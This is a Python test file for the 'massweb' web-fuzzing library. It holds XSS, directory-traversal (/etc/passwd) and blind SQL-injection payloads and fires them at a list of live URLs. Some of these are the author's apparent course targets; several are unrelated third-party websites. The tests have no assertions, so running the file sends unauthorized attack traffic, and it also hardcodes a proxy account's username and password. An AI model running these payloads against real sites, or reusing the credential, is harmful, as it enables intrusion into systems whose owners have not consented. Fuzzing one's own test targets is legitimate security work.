""" """

import unittest
from massweb.targets.target import Target
from massweb.fuzzers.web_fuzzer import WebFuzzer
from massweb.fuzzers.bsqli_fuzzer import BSQLiFuzzer
from massweb.payloads.bsqli_payload import BSQLIPayload
from massweb.payloads.bsqli_payload_group import BSQLIPayloadGroup
from massweb.payloads.payload import Payload

proxy_cred = {'username':'hyperiongray', 'password':'cL93TgopPd'}
proxies = {"http": "http://%(username)s:%(password)s@proxy.crawlera.com:8010" % proxy_cred}
proxy_scan_list = [proxies]

stargets = [u'course.hyperiongray.com/vuln1',
    u"http://course.hyperiongray.com/vuln1",
    u"http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/",
    u"http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E",
    u"http://www.sfgcd.com/ProductsBuy.asp?ProNo=1%3E&amp;ProName=1",
    u"http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=1",
    u"http://www.dobrevsource.org/index.php?id=1"]

targets = [Target(x) for x in stargets]

payloads = [Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"]),
    Payload('../../../../../../../../../../../../../../../../../../etc/passwd', check_type_list = ["trav"]),
    Payload("')--", check_type_list = ["sqli", "xpathi"])]

xss_targets = sqli_targets = bsqli_targetes = trav_targets = xpath_targets = osci_targets = targets

class TestFuzzers(unittest.TestCase):
    """ """

    def test_bsqlifuzzer(self):
        # Create true and false conditions using AND
        generic_true_payload = BSQLIPayload(" AND 1=1", {"truth" : True})
        generic_false_payload = BSQLIPayload(" AND 1=2", {"truth" : False})
        # Create PayloadGroup
        generic_payload_group = BSQLIPayloadGroup(generic_true_payload, generic_false_payload)
        # This second group is for checking the returned content length
        # Create true and false conditions using OR
        dump_true_payload = BSQLIPayload(" OR 1=1", {"truth" : True})
        dump_false_payload = BSQLIPayload(" OR 1=2", {"truth" : False})
        dump_payload_group = BSQLIPayloadGroup(dump_true_payload, dump_false_payload)
        payload_groups = [generic_payload_group, dump_payload_group]
        bf = BSQLiFuzzer(targets, bsqli_payload_groups = payload_groups, hadoop_reporting=False, num_threads=10)
        result = bf.fuzz()
        # assertions


    def test_webfuzzer(self):
        wf = WebFuzzer(targets, num_threads=25, time_per_url=5, request_timeout=4, proxy_list=proxy_scan_list, hadoop_reporting=False)
        for payload in payloads:
            wf.add_payload(payload)
        wf.generate_fuzzy_targets()
        result = wf.fuzz()
        # assertions
        

if __name__ == '__main__':
    unittest.main()
